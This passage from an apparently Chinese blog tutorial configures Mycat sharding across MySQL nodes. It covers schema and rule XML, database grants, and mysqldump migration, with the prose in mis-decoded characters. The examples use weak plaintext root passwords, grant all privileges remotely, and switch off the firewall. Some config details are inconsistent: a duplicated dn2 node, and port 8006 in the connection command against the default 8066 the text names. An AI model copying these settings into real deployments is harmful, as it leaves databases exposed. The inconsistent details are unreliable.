class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE mycat:schema SYSTEM "schema.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">mycat:schema</span> <span class="attr">xmlns:mycat</span>=<span class="string">"http://io.mycat/"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--å®šä¹‰é€»è¾‘æ•°æ®åº“TESTDBï¼Œé€»è¾‘è¡¨t_rune,ä¸»é”®ã€åˆ‡åˆ†è§„åˆ™(mod-long)ï¼Œå’Œæ•°æ®åº“èŠ‚ç‚¹(dn2,dn2,dn3)--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">"TESTDB"</span> <span class="attr">checkSQLschema</span>=<span class="string">"false"</span> <span class="attr">sqlMaxLimit</span>=<span class="string">"100"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_rune"</span>  <span class="attr">primaryKey</span>=<span class="string">"uid"</span> <span class="attr">dataNode</span>=<span class="string">"dn2,dn2,dn3"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span> &gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">schema</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--å®šä¹‰æ¯ä¸ªæ•°æ®åº“èŠ‚ç‚¹ç›¸å…³ä¿¡æ¯--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn2"</span> <span class="attr">dataHost</span>=<span class="string">"server1"</span> <span class="attr">database</span>=<span class="string">"db1"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn2"</span> <span class="attr">dataHost</span>=<span class="string">"server1"</span> <span class="attr">database</span>=<span class="string">"db2"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn3"</span> <span class="attr">dataHost</span>=<span class="string">"server1"</span> <span class="attr">database</span>=<span class="string">"db3"</span> /&gt;</span></div><div class="line">        <span class="comment">&lt;!--ç­‰åŒäºä»¥ä¸Šé…ç½®&lt;dataNodename=â€œdn$1-3â€ dataHost=â€œserver1â€ database=â€œdb$1-3â€/&gt; --&gt;</span></div><div class="line">        <span class="comment">&lt;!--å®šä¹‰ä¸»æœºä¿¡æ¯ï¼ŒåŠMysqlç”¨æˆ·å¯†ç --&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">"server1"</span> <span class="attr">maxCon</span>=<span class="string">"1000"</span> <span class="attr">minCon</span>=<span class="string">"10"</span> <span class="attr">balance</span>=<span class="string">"0"</span></span></div><div class="line"><span class="tag">                          <span class="attr">writeType</span>=<span class="string">"0"</span> <span class="attr">dbType</span>=<span class="string">"mysql"</span> <span class="attr">dbDriver</span>=<span class="string">"native"</span> <span class="attr">switchType</span>=<span class="string">"1"</span>  <span class="attr">slaveThreshold</span>=<span class="string">"100"</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--å¿ƒè·³æ£€æµ‹è¯­å¥--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!-- è¿œç¨‹æ•°æ®åº“é…ç½®ä¿¡æ¯ --&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">"192.168.99.21"</span> <span class="attr">url</span>=<span class="string">"192.168.99.214:3306"</span> <span class="attr">user</span>=<span class="string">"root"</span></span></div><div class="line"><span class="tag">                                   <span class="attr">password</span>=<span class="string">"root"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">writeHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">mycat:schema</span>&gt;</span></div></pre></div></div></figure><blockquote><p>æ— è®ºåˆ†ç‰‡ä¸å¦,æ¯å¼ è¡¨éƒ½éœ€è¦å®šä¹‰, ç”Ÿäº§,ä¾‹:</p></blockquote><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></div><div class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE mycat:schema SYSTEM "schema.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">mycat:schema</span> <span class="attr">xmlns:mycat</span>=<span class="string">"http://io.mycat/"</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">"bigduck"</span> <span class="attr">checkSQLschema</span>=<span class="string">"true"</span> <span class="attr">sqlMaxLimit</span>=<span class="string">"100"</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--åˆ†--&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_shop_visible--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_shop_visible"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn$1-15"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_friendlog--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_friendlog"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn$1-15"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_room--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_room"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn$1-15"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_npc--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_npc"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn$1-15"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_arena_fight--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_arena_fight"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn$1-15"</span> <span class="attr">rule</span>=<span class="string">"mod-long"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--ä¸åˆ†--&gt;</span></div><div class="line">                <span class="comment">&lt;!--alliance_id--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"alliance_id"</span> <span class="attr">primaryKey</span>=<span class="string">"seq_id"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_alliance_boss--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_alliance_boss"</span> <span class="attr">primaryKey</span>=<span class="string">"ALLIANCEID"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_alliance_boss_id--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_alliance_boss_id"</span> <span class="attr">primaryKey</span>=<span class="string">"ALLIANCEID"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_alliance_boss_log--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_alliance_boss_log"</span> <span class="attr">primaryKey</span>=<span class="string">"ID"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--t_alliance_member_boss--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_alliance_member_boss"</span> <span class="attr">primaryKey</span>=<span class="string">"UID"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">                <span class="comment">&lt;!-- global table is auto cloned to all defined data nodes ,so can join</span></div><div class="line"><span class="comment">                        with any table whose sharding node is in the same data node --&gt;</span></div><div class="line">                <span class="comment">&lt;!--å…¨å±€è¡¨--&gt;</span></div><div class="line"><span class="comment">&lt;!--t_arena--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">"t_arena"</span> <span class="attr">primaryKey</span>=<span class="string">"UID"</span> <span class="attr">type</span>=<span class="string">"global"</span> <span class="attr">dataNode</span>=<span class="string">"dn2"</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">        <span class="tag">&lt;/<span class="name">schema</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn$1-5"</span> <span class="attr">dataHost</span>=<span class="string">"mysql-server-01"</span> <span class="attr">database</span>=<span class="string">"db$11-15"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn$6-10"</span> <span class="attr">dataHost</span>=<span class="string">"mysql-server-02"</span> <span class="attr">database</span>=<span class="string">"db$21-25"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">"dn$11-15"</span> <span class="attr">dataHost</span>=<span class="string">"mysql-server-03"</span> <span class="attr">database</span>=<span class="string">"db$31-35"</span> /&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">"mysql-server-01"</span> <span class="attr">maxCon</span>=<span class="string">"2000"</span> <span class="attr">minCon</span>=<span class="string">"100"</span> <span class="attr">balance</span>=<span class="string">"0"</span> <span class="attr">dbType</span>=<span class="string">"mysql"</span> <span class="attr">dbDriver</span>=<span class="string">"native"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">"172.17.0.2"</span> <span class="attr">url</span>=<span class="string">"172.17.0.2:3306"</span> <span class="attr">user</span>=<span class="string">"root"</span></span></div><div class="line"><span class="tag">                                   <span class="attr">password</span>=<span class="string">"pa33w0rd"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">writeHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">"mysql-server-02"</span> <span class="attr">maxCon</span>=<span class="string">"2000"</span> <span class="attr">minCon</span>=<span class="string">"100"</span> <span class="attr">balance</span>=<span class="string">"0"</span> <span class="attr">dbType</span>=<span class="string">"mysql"</span> <span class="attr">dbDriver</span>=<span class="string">"native"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">"172.17.0.3"</span> <span class="attr">url</span>=<span class="string">"172.17.0.3:3306"</span> <span class="attr">user</span>=<span class="string">"root"</span></span></div><div class="line"><span class="tag">                                   <span class="attr">password</span>=<span class="string">"pa33w0rd"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">writeHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">"mysql-server-03"</span> <span class="attr">maxCon</span>=<span class="string">"2000"</span> <span class="attr">minCon</span>=<span class="string">"100"</span> <span class="attr">balance</span>=<span class="string">"0"</span> <span class="attr">dbType</span>=<span class="string">"mysql"</span> <span class="attr">dbDriver</span>=<span class="string">"native"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">"172.17.0.4"</span> <span class="attr">url</span>=<span class="string">"172.17.0.4:3306"</span> <span class="attr">user</span>=<span class="string">"root"</span></span></div><div class="line"><span class="tag">                                   <span class="attr">password</span>=<span class="string">"pa33w0rd"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">writeHost</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">mycat:schema</span>&gt;</span></div></pre></div></div></figure><h3 id="é…ç½®åˆ‡ç‰‡è§„åˆ™"><a href="#é…ç½®åˆ‡ç‰‡è§„åˆ™" class="headerlink" title="é…ç½®åˆ‡ç‰‡è§„åˆ™"></a>é…ç½®åˆ‡ç‰‡è§„åˆ™</h3><p>åœ¨ä¸Šæ­¥çš„<code>schema.xml</code>æ–‡ä»¶ä¸­å®šä¹‰äº†åˆ†ç‰‡è§„åˆ™ï¼š<code>rule=&quot;mod-long&quot;</code>æ­¤æ—¶ç¼–è¾‘<code>conf/rule.xml</code>æ–‡ä»¶æ·»åŠ åˆ†ç‰‡è§„åˆ™çš„å…·ä½“å‚æ•°ä¿¡æ¯</p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></div><div class="code"><pre><div class="line">        <span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"mod-long"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">                        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>uid<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">                        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>mod-long<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line"><span class="comment">name å±æ€§æŒ‡å®šå”¯ä¸€çš„åå­—ï¼Œç”¨äºæ ‡è¯†ä¸åŒçš„è¡¨è§„åˆ™ã€‚</span></div><div class="line"><span class="comment">å†…åµŒçš„ rule æ ‡ç­¾åˆ™æŒ‡å®šå¯¹ç‰©ç†è¡¨ä¸­çš„å“ªä¸€åˆ—è¿›è¡Œæ‹†åˆ†å’Œä½¿ç”¨ä»€ä¹ˆè·¯ç”±ç®—æ³•ã€‚</span></div><div class="line"><span class="comment">columns å†…æŒ‡å®šè¦æ‹†åˆ†çš„åˆ—åå­—ã€‚</span></div><div class="line"><span class="comment">algorithm ä½¿ç”¨ function æ ‡ç­¾ä¸­çš„ name å±æ€§ã€‚è¿æ¥è¡¨è§„åˆ™å’Œå…·ä½“è·¯ç”±ç®—æ³•ã€‚å½“ç„¶ï¼Œå¤šä¸ªè¡¨è§„åˆ™å¯ä»¥è¿æ¥åˆ°</span></div><div class="line"><span class="comment">åŒä¸€ä¸ªè·¯ç”±ç®—æ³•ä¸Šã€‚table æ ‡ç­¾å†…ä½¿ç”¨ã€‚è®©é€»è¾‘è¡¨ä½¿ç”¨è¿™ä¸ªè§„åˆ™è¿›è¡Œåˆ†ç‰‡ã€‚</span></div><div class="line"><span class="comment">--&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"mod-long"</span> <span class="attr">class</span>=<span class="string">"io.mycat.route.function.PartitionByMod"</span>&gt;</span></div><div class="line">                <span class="comment">&lt;!--æ³¨æ„ï¼è¿™é‡Œå¡«å†™æ•°æ®åº“èŠ‚ç‚¹æ•°ï¼Œå¦åˆ™æ— æ³•åˆ†ç‰‡--&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">name æŒ‡å®šç®—æ³•çš„åå­—ã€‚</span></div><div class="line"><span class="comment">class åˆ¶å®šè·¯ç”±ç®—æ³•å…·ä½“çš„ç±»åå­—ã€‚ï¼ˆæ­¤å¤„ä½¿ç”¨æ±‚æ¨¡æ³•ï¼‰</span></div><div class="line"><span class="comment">property ä¸ºå…·ä½“ç®—æ³•éœ€è¦ç”¨åˆ°çš„ä¸€äº›å±æ€§ã€‚</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">--&gt;</span></div></pre></div></div></figure><blockquote><p>å…·ä½“åˆ‡ç‰‡ç®—æ³•è§„åˆ™ï¼š<strong><a href="https://kionf.com/2017/05/07/mycat-alg/">Mycatåˆ‡ç‰‡ç®—æ³•è§„åˆ™è¯¦è§£</a></strong></p></blockquote><h1 id="0x02-é…ç½®æ•°æ®åº“èŠ‚ç‚¹"><a href="#0x02-é…ç½®æ•°æ®åº“èŠ‚ç‚¹" class="headerlink" title="0x02 é…ç½®æ•°æ®åº“èŠ‚ç‚¹"></a>0x02 é…ç½®æ•°æ®åº“èŠ‚ç‚¹</h1><p>é…ç½®server1æ•°æ®åº“ï¼Œç”¨æˆ·å¯†ç ä¸º<code>schema.xml</code>æ–‡ä»¶ä¸­é…ç½®ç›¸åŒï¼Œå¹¶å…è®¸server2è¿ç¨‹è¿æ¥</p><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">'root'</span>@<span class="string">'192.168.99.216'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'root'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</div><div class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</div></pre></div></div></figure><p>åˆ›å»ºé…ç½®æ–‡ä»¶ä¸­æ•°æ®åº“èŠ‚ç‚¹db1,db2.db3</p><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">database</span> db1 <span class="built_in">character</span> <span class="keyword">set</span> utf8;</div><div class="line"><span class="keyword">create</span> <span class="keyword">database</span> db2 <span class="built_in">character</span> <span class="keyword">set</span> utf8;</div><div class="line"><span class="keyword">create</span> <span class="keyword">database</span> db3 <span class="built_in">character</span> <span class="keyword">set</span> utf8;</div></pre></div></div></figure><p>æµ‹è¯•ç¯å¢ƒä¸­ç¡®è®¤2å°æœºå™¨é˜²ç«å¢™å…³é—­<code>server iptables stop</code></p><p>è¿”å›åˆ°server1å¯åŠ¨Mycat</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mycat</div><div class="line"></div><div class="line">./bin/mycat start</div><div class="line"></div><div class="line">[root@Centos6-8-TestEnv mycat]<span class="comment"># netstat -ntlp</span></div><div class="line">Active Internet connections (only servers)</div><div class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   </div><div class="line">tcp        0      0 127.0.0.1:32000             0.0.0.0:*                   LISTEN      8613/java           </div><div class="line">tcp        0      0 :::1984                     :::*                        LISTEN      8613/java     </div><div class="line">tcp        0      0 :::8066                     :::*                        LISTEN      8613/java</div><div class="line"><span class="comment">#ç¡®ä¿8066ç«¯å£ç›‘å¬æ­¤ä¸ºMycatæœåŠ¡å™¨é»˜è®¤ç«¯å£         </span></div><div class="line">tcp        0      0 :::60743                    :::*                        LISTEN      8613/java    </div><div class="line">tcp        0      0 :::43303                    :::*                        LISTEN      8613/java    </div><div class="line">tcp        0      0 :::9066                     :::*                        LISTEN      8613/java</div></pre></div></div></figure><h1 id="0x03-æ•°æ®è¿ç§»"><a href="#0x03-æ•°æ®è¿ç§»" class="headerlink" title="0x03 æ•°æ®è¿ç§»"></a>0x03 æ•°æ®è¿ç§»</h1><p>ç¼–è¾‘<code>/etc/my.cnf</code>æ·»åŠ <br><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">[mysqldump]</div><div class="line"></div><div class="line">max_allowed_packet      = 16M</div><div class="line">#default-character-set   = utf8mb4</div></pre></div></div></figure></p><p>mysqldumpå¯¼å…¥æŠ¥<code>ERROR 1153 (08S01) at line 1133809: Got a packet bigger than &#39;max_allowed_packet&#39; bytes</code>é”™è¯¯ï¼Œå› ä¸ºMySQLå…è®¸çš„é»˜è®¤å¤§å°ä¸º1MBã€‚</p><p><strong><code>æ³¨æ„ï¼ŒMycatåœ¨æ‰§è¡ŒINSERTè¯­å¥æ—¶éœ€è¦å®Œæ•´INSERTè¯­å¥(ç”¨åˆ—å)</code></strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">mysqldump -uroot -p -c --skip-add-locks --skip-extended-insert --no-autocommit databaseName &gt; databaseName.sql</div><div class="line"></div><div class="line"><span class="comment"># -c                     å‚æ•°ä¸å¯å°‘ï¼Œ-c, å…¨ç§°ä¸ºâ€“complete-insert è¡¨ç¤ºä½¿ç”¨å®Œæ•´çš„ insert è¯­å¥(ç”¨åˆ—åå­—)ã€‚</span></div><div class="line"><span class="comment"># --skip-add-locks       è¡¨ç¤ºå¯¼æ•°æ®æ—¶ä¸åŠ é”ï¼Œå¦‚æœåŠ é”æ¶‰åŠå¤šåˆ†ç‰‡æ—¶å®¹æ˜“å¯¼è‡´æ­»é”ã€‚</span></div><div class="line"><span class="comment"># --skip-extended-insert å°†æ¯è¡Œæ•°æ®è¾“å‡ºä¸ºä¸€ä¸ªå•ç‹¬çš„insertè¯­å¥</span></div><div class="line"><span class="comment"># --no-autocommit        å‚æ•°åœ¨æ¯ä¸ªè¡¨æ ¼æ‰€æœ‰çš„æ’å…¥è¯­å¥çš„å‰ååˆ†åˆ«å¢åŠ SET autocommit = 0å’ŒCOMMITè¯­å¥ã€‚ç›¸æ¯”æ²¡æœ‰è¿™ä¸ªå‚æ•°ï¼Œæ’å…¥é€Ÿåº¦èƒ½å·®å‡ºè‡³å°‘200å€ï¼Œåˆ†åˆ«æ˜¯10000QPSå’Œ50QPS</span></div></pre></div></div></figure><p>å¯¼å…¥æ•°æ®</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">mysql -uroot -ptest -h192.168.99.216 -P8006 TESTDB <span class="comment">#è¿æ¥Mycat</span></div><div class="line"></div><div class="line"><span class="built_in">source</span> /t_rune.sql <span class="comment">#å¯¼å…¥æ•°æ®</span></div></pre></div></div></figure><p>æˆåŠŸåå¯ä»¥åœ¨server2ä¸­çœ‹åˆ°db1,db2.db3å·²ç»å­˜å…¥æ•°æ®ã€‚é”™è¯¯æ—¥å¿—åœ¨ <code>logs/mycat.log</code>æ–‡ä»¶ä¸­</p><blockquote><p>è¿æ¥Mycat <code>select * from table</code> æ—¶ï¼ŒMycaté»˜è®¤<code>limit 100</code>æ­¤é…ç½®å¯ä»<code>schema.xml</code>æ–‡ä»¶ä¸­ä¿®æ”¹<code>sqlMaxLimit=&quot;100&quot;</code>å®šä¹‰</p></blockquote><h1 id="0x04-ä¼šç”¨åˆ°çš„sql"><a href="#0x04-ä¼šç”¨åˆ°çš„sql" class="headerlink" title="0x04 ä¼šç”¨åˆ°çš„sql"></a>0x04 ä¼šç”¨åˆ°çš„sql</h1><p>æŸ¥è¯¢æ‰€æœ‰è¡¨çš„ä¸»é”®</p><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">SELECT</span> k.column_name,k.table_name <span class="keyword">FROM</span> information_schema.table_constraints t <span class="keyword">JOIN</span> information_schema.key_column_usage k <span class="keyword">USING</span> (constraint_name,table_schema,table_name) <span class="keyword">WHERE</span> t.constraint_type=<span class="string">'PRIMARY KEY'</span>   <span class="keyword">AND</span> t.table_schema=<span class="string">'æ•°æ®åº“'</span>;</div></pre></div></div></figure><p>æŸ¥è¯¢æ‰€æœ‰è¡¨çš„è®°å½•æ•°(è¡Œæ•°)</p><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">select</span> table_name,table_rows <span class="keyword">from</span> information_schema.tables  <span class="keyword">where</span> TABLE_SCHEMA = <span class="string">'æ•°æ®åº“'</span>  <span class="keyword">order</span> <span class="keyword">by</span> table_rows <span class="keyword">desc</span>;</div><div class="line"></div><div class="line">#å¯¹äºInnoDBè¡¨ï¼Œtable_rowsè¡Œè®¡æ•°ä»…æ˜¯å¤§æ¦‚ä¼°è®¡å€¼ã€‚</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
          <category> Mycat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mycat </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mycatåˆ†ç‰‡è§„åˆ™</title>
      <link href="/2017/05/07/mycat-alg/"/>
      <url>/2017/05/07/mycat-alg/</url>
